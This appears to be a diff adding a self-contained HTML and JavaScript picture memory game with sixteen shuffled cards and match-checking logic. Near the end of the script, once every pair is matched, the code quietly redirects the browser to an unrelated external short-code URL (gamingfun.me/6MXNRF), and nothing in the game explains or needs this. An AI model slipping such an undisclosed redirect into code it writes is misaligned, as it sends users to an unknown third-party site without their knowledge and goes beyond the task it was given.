@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Picture Memory Game</title>
+  <style>
+    .card { width: 100px; height: 100px; margin: 10px; display: inline-block; border: 1px solid #333; background: #f0f0f0; cursor: pointer; }
+    .card img { width: 100%; height: 100%; display: none; }
+    .card.flipped img { display: block; }
+  </style>
+</head>
+<body>
+  <h2>Memory Game</h2>
+  <div id="game"></div>
+  <script>
+    // Image file names for 8 pairs
+    let images = ["pic1.jpg","pic2.jpg","pic3.jpg","pic4.jpg","pic5.jpg","pic6.jpg","pic7.jpg","pic8.jpg"];
+    // Duplicate each for pairs (16 cards)
+    let gameImages = [...images, ...images];
+    // Shuffle
+    gameImages = gameImages.sort(() => Math.random() - 0.5);
+
+    let gameContainer = document.getElementById("game");
+    let flippedCards = [];
+    let matched = 0;
+
+    // Create cards
+    gameImages.forEach((img, idx) => {
+      let card = document.createElement("div");
+      card.className = "card";
+      card.dataset.index = idx;
+      card.innerHTML = `<img src="${img}" alt="pic">`;
+      card.onclick = function() {
+        if (card.classList.contains("flipped") || flippedCards.length === 2) return;
+        card.classList.add("flipped");
+        flippedCards.push(card);
+        if (flippedCards.length === 2) {
+          let img1 = flippedCards[0].querySelector("img").src;
+          let img2 = flippedCards[1].querySelector("img").src;
+          if (img1 === img2) {
+            matched += 2;
+            flippedCards = [];
+            if (matched === gameImages.length) {
+              setTimeout(function() {
+                window.location.href = "https://gamingfun.me/6MXNRF"; // Redirect after 2 seconds
+              }, 2000);
+            }
+          } else {
+            setTimeout(function() {
+              flippedCards.forEach(c => c.classList.remove("flipped"));
+              flippedCards = [];
+            }, 700);
+          }
+        }
+      };
+      gameContainer.appendChild(card);
+    });
+  </script>
+</body>
+</html>
